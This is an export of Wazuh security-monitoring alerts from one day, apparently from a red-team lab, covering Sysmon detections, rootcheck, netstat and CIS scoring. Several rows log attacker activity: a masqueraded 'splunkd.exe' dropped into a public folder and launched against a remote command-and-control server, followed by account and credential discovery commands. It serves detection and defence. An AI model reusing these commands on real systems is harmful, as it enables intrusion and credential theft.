wazuh-alerts-4.x-2024.12.22,wkqZ7ZMBNimV4ECvlIBl,1,1,192.168.117.139,window-agent3,3,Maryam,"hr=0x8007139F, RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=TimerEvent", ,8198,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},2,Application,0,"""License Activation (slui.exe) failed with the following error code:
hr=0x8007139F
Command-line arguments:
RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=TimerEvent""",0,2024-12-22T09:01:22.5427712Z,6988,0,DESKTOP-QGB4EQH,0,0,ERROR,Microsoft-Windows-Security-SPP,3,FALSE,5,License activation (slui.exe) failed.,"[""windows"",""windows_application""]",60646,windows_eventchannel,log,"Dec 22, 2024 @ 09:01:22.088",EventChannel,1734858082,"Dec 22, 2024 @ 09:01:22.088", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,hkqN7ZMBNimV4ECv3oCp,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,2,FALSE,7,Host-based anomaly detection event (rootcheck).,"[""ossec"",""rootcheck""]",510,rootcheck,log,"Dec 22, 2024 @ 08:45:24.085",rootcheck,1734857124,"Dec 22, 2024 @ 08:45:24.085", , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]", , ,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Trojaned version of file '/usr/bin/diff' detected. Signature used: 'bash|^/bin/sh|file\.h|proc\.h|/dev/[^n]|^/bin/.*sh' (Generic)., , , , , , , , , , , , , , ,/usr/bin/diff,Trojaned version of file detected., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,iEqN7ZMBNimV4ECv34BP,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,Listened ports status (netstat) changed (new port opened or closed).,"[""ossec""]",533,ossec,log,"Dec 22, 2024 @ 08:45:27.830",netstat listening ports,1734857127,"Dec 22, 2024 @ 08:45:27.830", , , , , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.2.7"",""10.6.1""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.14"",""AU.6""]","[""IV_35.7.d""]", , , ,"[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,"Previous output:
ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 247/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 247/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 236/node
tcp 0.0.0.0:1514 0.0.0.0:* 1944/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 1605/wazuh-authd
tcp6 127.0.0.1:9200 :::* 1236/java
tcp6 127.0.0.1:9300 :::* 1236/java
tcp 0.0.0.0:55000 0.0.0.0:* 1550/python3","ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 272/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 272/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 213/node
tcp 0.0.0.0:1514 0.0.0.0:* 1966/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 1634/wazuh-authd
tcp 0.0.0.0:55000 0.0.0.0:* 1578/python3","ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 247/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 247/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 236/node
tcp 0.0.0.0:1514 0.0.0.0:* 1944/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 1605/wazuh-authd
tcp6 127.0.0.1:9200 :::* 1236/java
tcp6 127.0.0.1:9300 :::* 1236/java
tcp 0.0.0.0:55000 0.0.0.0:* 1550/python3", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,xkqZ7ZMBNimV4ECvr4C2,1,1,192.168.117.129,agent1,4,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,SCA summary: CIS Microsoft Windows 10 Enterprise Benchmark v1.12.0: Score less than 50% (33),"[""sca""]",19004,sca,log,"Dec 22, 2024 @ 09:01:29.438",sca,1734858089,"Dec 22, 2024 @ 09:01:29.438", , , , , , , , , , , , , , , , , , , , , , , ,"[""2.2""]","[""CC7.1"",""CC7.2""]","[""CM.1""]","[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,33,394,cis_win10_enterprise.yml,cis_win10_enterprise,4,This document provides prescriptive guidance for establishing a secure configuration posture for Microsoft Windows 10 Enterprise.,396447457,129,261,summary,CIS Microsoft Windows 10 Enterprise Benchmark v1.12.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,QUqe7ZMBNimV4ECv5IED,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-12-22 09:07:06.615
ProcessGuid: {15959494-d6ba-6767-cd01-000000001100}
ProcessId: 11548
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-d650-6767-a301-000000001100}
ParentProcessId: 9000
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:07:06.6293687Z,223455,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,4,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:06.794",EventChannel,1734858427,"Dec 22, 2024 @ 09:07:06.794", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,11548, , , , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", ,C:\\Windows\\System32\\cmd.exe, ,{15959494-d6ba-6767-cd01-000000001100},07:06.6, , ,DESKTOP-QGB4EQH\\mari,Cmd.Exe,Microsoft® Windows® Operating System,{15959494-d650-6767-a301-000000001100},Windows Command Processor,"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x2b38ea,9000,C:\\Users\\mari\\,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18",C:\\Users\\Public\\splunkd.exe,"technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",Medium,10.0.19041.4355 (WinBuild.160101.0800),1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Q0qe7ZMBNimV4ECv5IED,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-22 09:07:06.683
ProcessGuid: {15959494-d6ba-6767-ce01-000000001100}
ProcessId: 11552
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-d6ba-6767-cd01-000000001100}
ParentProcessId: 11548
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:07:06.6855719Z,223457,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:06.826",EventChannel,1734858427,"Dec 22, 2024 @ 09:07:06.826", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,11552, , , , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", ,C:\\Windows\\System32\\net.exe, ,{15959494-d6ba-6767-ce01-000000001100},07:06.7, , ,DESKTOP-QGB4EQH\\mari,net.exe,Microsoft® Windows® Operating System,{15959494-d6ba-6767-cd01-000000001100},Net Command,"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0x2b38ea,11548,C:\\Users\\mari\\,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07",C:\\Windows\\System32\\cmd.exe,"technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,net  user,Medium,10.0.19041.1 (WinBuild.160101.0800),1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,RUqe7ZMBNimV4ECv5IED,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-22 09:07:06.828
ProcessGuid: {15959494-d6ba-6767-d101-000000001100}
ProcessId: 11772
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup ""Users"" 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-d6ba-6767-cd01-000000001100}
ParentProcessId: 11548
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:07:06.8300140Z,223460,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:06.857",EventChannel,1734858427,"Dec 22, 2024 @ 09:07:06.857", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,11772, , , , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", ,C:\\Windows\\System32\\net.exe, ,{15959494-d6ba-6767-d101-000000001100},07:06.8, , ,DESKTOP-QGB4EQH\\mari,net.exe,Microsoft® Windows® Operating System,{15959494-d6ba-6767-cd01-000000001100},Net Command,"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0x2b38ea,11548,C:\\Users\\mari\\,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07",C:\\Windows\\System32\\cmd.exe,"technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,"net  localgroup \""Users\""",Medium,10.0.19041.1 (WinBuild.160101.0800),1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,R0qe7ZMBNimV4ECv5IED,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-22 09:07:06.847
ProcessGuid: {15959494-d6ba-6767-d201-000000001100}
ProcessId: 11432
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1  localgroup ""Users"" 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8
ParentProcessGuid: {15959494-d6ba-6767-d101-000000001100}
ParentProcessId: 11772
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup ""Users"" 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:07:06.8483463Z,223461,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,19,FALSE,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:06.892",EventChannel,1734858427,"Dec 22, 2024 @ 09:07:06.892", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,11432, , , , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", ,C:\\Windows\\System32\\net1.exe, ,{15959494-d6ba-6767-d201-000000001100},07:06.8, , ,DESKTOP-QGB4EQH\\mari,net1.exe,Microsoft® Windows® Operating System,{15959494-d6ba-6767-d101-000000001100},Net Command,"net  localgroup \""Users\""",0x2b38ea,11772,C:\\Users\\mari\\,"SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8",C:\\Windows\\System32\\net.exe,"technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,"C:\\WINDOWS\\system32\\net1  localgroup \""Users\""",Medium,10.0.19041.3636 (WinBuild.160101.0800),1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Kkqc7ZMBNimV4ECv1IGc,1,1,192.168.117.139,window-agent3,3,Maryam, , ,10, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2024-12-22 09:04:50.755
SourceProcessGUID: {15959494-d612-6767-6601-000000001100}
SourceProcessId: 5744
SourceThreadId: 8980
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {15959494-d5be-6767-0701-000000001100}
TargetProcessId: 5296
TargetImage: C:\WINDOWS\Explorer.EXE
GrantedAccess: 0x1410
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+9d9b4|C:\WINDOWS\System32\KERNELBASE.dll+338ae|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\760cb5c95e85b3ca290b5f9e74e19368\System.ni.dll+34f530|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\760cb5c95e85b3ca290b5f9e74e19368\System.ni.dll+2cd89e|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\760cb5c95e85b3ca290b5f9e74e19368\System.ni.dll+2cccdf|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\760cb5c95e85b3ca290b5f9e74e19368\System.ni.dll+29f995|C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System\760cb5c95e85b3ca290b5f9e74e19368\System.ni.dll+2b2bf4|UNKNOWN(00007FF90FB63A61)
SourceUser: DESKTOP-QGB4EQH\mari
TargetUser: DESKTOP-QGB4EQH\mari""",3,2024-12-22T09:04:50.7625513Z,221939,4236,DESKTOP-QGB4EQH,10,2876,INFORMATION,Microsoft-Windows-Sysmon,1,TRUE,12,"Explorer process was accessed by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, possible process injection","[""sysmon"",""sysmon_eid10_detections"",""windows""]",92910,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:51.021",EventChannel,1734858292,"Dec 22, 2024 @ 09:04:51.021", , , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""Process Injection""]","[""T1055""]","[""Defense Evasion"",""Privilege Escalation""]", , , , ,04:50.8, , , , , , , , , , , , , ,"technique_id=T1055.001,technique_name=Dynamic-link Library Injection", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,0x1410,5296,DESKTOP-QGB4EQH\\mari,C:\\WINDOWS\\Explorer.EXE,{15959494-d612-6767-6601-000000001100},C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9d9b4|C:\\WINDOWS\\System32\\KERNELBASE.dll+338ae|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\760cb5c95e85b3ca290b5f9e74e19368\\System.ni.dll+34f530|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\760cb5c95e85b3ca290b5f9e74e19368\\System.ni.dll+2cd89e|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\760cb5c95e85b3ca290b5f9e74e19368\\System.ni.dll+2cccdf|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\760cb5c95e85b3ca290b5f9e74e19368\\System.ni.dll+29f995|C:\\WINDOWS\\assembly\\NativeImages_v4.0.30319_64\\System\\760cb5c95e85b3ca290b5f9e74e19368\\System.ni.dll+2b2bf4|UNKNOWN(00007FF90FB63A61),8980,{15959494-d5be-6767-0701-000000001100},5744,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,K0qc7ZMBNimV4ECv1IGc,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-22 09:04:52.395
ProcessGuid: {15959494-d612-6767-6601-000000001100}
ProcessId: 5744
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Public\splunkd.exe
CreationUtcTime: 2024-12-16 06:41:03.222
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:52.4049065Z,221968,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,2,TRUE,12,Executable file dropped in Users\Public folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92207,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:52.929",EventChannel,1734858293,"Dec 22, 2024 @ 09:04:52.929", , , , , , , , , , , , , , ,5744, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, ,{15959494-d612-6767-6601-000000001100},04:52.4, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\Public\\splunkd.exe,41:03.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,LEqc7ZMBNimV4ECv1IGc,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-22 09:04:55.880
ProcessGuid: {15959494-d637-6767-9101-000000001100}
ProcessId: 564
Image: C:\Users\mari\AppData\Local\Microsoft\EdgeUpdate\Install\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\EU8941.tmp\MicrosoftEdgeUpdate.exe
CreationUtcTime: 2024-12-22 09:04:55.880
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:55.8847132Z,222014,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,2,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:55.896",EventChannel,1734858296,"Dec 22, 2024 @ 09:04:55.896", , , , , , , , , , , , , , ,564, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe, ,{15959494-d637-6767-9101-000000001100},04:55.9, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\EU8941.tmp\\MicrosoftEdgeUpdate.exe,04:55.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,LUqc7ZMBNimV4ECv1IGc,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-22 09:04:55.927
ProcessGuid: {15959494-d637-6767-9101-000000001100}
ProcessId: 564
Image: C:\Users\mari\AppData\Local\Microsoft\EdgeUpdate\Install\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\EU8941.tmp\MicrosoftEdgeUpdateBroker.exe
CreationUtcTime: 2024-12-22 09:04:55.927
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:55.9385461Z,222018,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,3,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:55.986",EventChannel,1734858296,"Dec 22, 2024 @ 09:04:55.986", , , , , , , , , , , , , , ,564, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe, ,{15959494-d637-6767-9101-000000001100},04:55.9, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\EU8941.tmp\\MicrosoftEdgeUpdateBroker.exe,04:55.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Mkqc7ZMBNimV4ECv2IF3,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-22 09:04:56.505
ProcessGuid: {15959494-d637-6767-9101-000000001100}
ProcessId: 564
Image: C:\Users\mari\AppData\Local\Microsoft\EdgeUpdate\Install\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\EU8941.tmp\MicrosoftEdgeUpdateSetup.exe
CreationUtcTime: 2024-12-22 09:04:56.505
